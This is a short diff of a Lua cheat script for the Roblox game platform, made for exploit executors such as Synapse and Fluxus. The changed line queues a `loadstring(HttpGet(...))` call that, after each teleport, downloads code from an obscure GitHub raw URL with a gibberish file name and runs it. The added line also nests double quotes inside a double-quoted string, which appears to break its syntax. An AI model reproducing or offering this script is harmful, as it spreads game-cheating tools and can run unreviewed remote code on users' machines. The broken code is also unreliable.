@@ -1,7 +1,7 @@
 -- Teleport queue for supported environments
 local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
 if queueteleport then
-    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/SEA-HUBZ/SEAHUB-LAB/main/lua', true))()")
+    queueteleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/Quapidus/Os-uff-gy-kb-pc-pc/refs/heads/main/Aishdbdbdhduuddz28387336",true))()")
 end
 
 -- Function to update Titans' position based on Fake_Head or specific CFrame for a PlaceId
